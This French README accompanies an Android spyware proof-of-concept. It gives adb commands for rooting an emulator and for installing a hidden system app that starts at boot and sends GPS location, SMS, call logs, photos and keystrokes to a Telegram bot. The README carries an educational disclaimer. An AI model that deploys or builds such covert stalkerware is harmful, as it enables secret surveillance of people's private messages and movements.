# Projet Spyware Android — README

> Ce projet est exclusivement à **but pédagogique**. Il montre comment un spyware Android peut collecter et exfiltrer des données sensibles sur un appareil **rooté**.

---

## Prérequis

* **Android Studio** installé
* Un **émulateur Android** rooté :

  * Émulateur Android Studio (rootable via Magisk)
  * Ou **Genymotion Desktop** (recommandé pour test GPS & root facile)

---

## Rooter l’émulateur Android Studio (via Magisk)

1. Ouvre **AVD Manager** → Crée un appareil (ex : Pixel 3, Android 8.1 recommandé).

2. Télécharge l’image système **x86 avec Google APIs**.

3. Installe **Magisk** pour le root :

    - Récupère le fichier `boot.img` de l’émulateur (`$ANDROID_HOME/system-images/...`).
    - Patch le fichier avec l’application **Magisk** (via un device rooté ou une VM).
    
      ```bash
      adb root
      adb remount
      adb push magisk_patched.img /sdcard/
      # Puis utilise fastboot ou un script pour remplacer le boot (varie selon émulateur)
      ```

> Il est aussi possible d’utiliser une image Genymotion déjà rootée pour éviter cette étape.

---

## Installation de l'application

1. **Cloner le projet** :

```bash
git clone https://github.com/ginjidraco/android-spyware-poc.git
```

2. **Générer l’APK** :

* Ouvrir dans Android Studio
* Build > Build APK(s) > Récupérer `app-debug.apk`

3. **Déployer en tant qu'application système** :

Dans un terminal ADB root :

```bash
adb.exe shell
su
mount -o remount,rw /system
mkdir /system/priv-app/spyware
cp /data/local/tmp/app-debug.apk /system/priv-app/spyware/
chmod 644 /system/priv-app/spyware/app-debug.apk
reboot
```

---

## Lancement de l’application

Cette app n’a **aucune interface utilisateur visible** (pas d’icône/menu). Elle est discrète et tourne en arrière-plan.

1. **Lancer l’application une première fois manuellement** pour demander les permissions :

```bash
adb shell am start -n com.ware.spyk/.MainActivity
```

2. **Acceptez toutes les permissions** (localisation, SMS, appels...)

3. **Redémarrez l’émulateur**

```bash
adb shell reboot
```

L’application s’exécutera désormais **automatiquement au démarrage**, collectant et exfiltrant les données via Telegram.

---

## Fonctionnalités

* Exfiltration de :

  *  Position GPS
  *  SMS 
  *  Appels entrants et sortants
  *  photos
  *  Touches tapées
* Envoi des données vers un **bot Telegram**

---

## ⚠ Disclaimer

Ce projet ne doit être utilisé **qu’à des fins pédagogiques ou de test** dans un environnement contrôlé. Son usage sur des appareils tiers est **strictement illégal**.

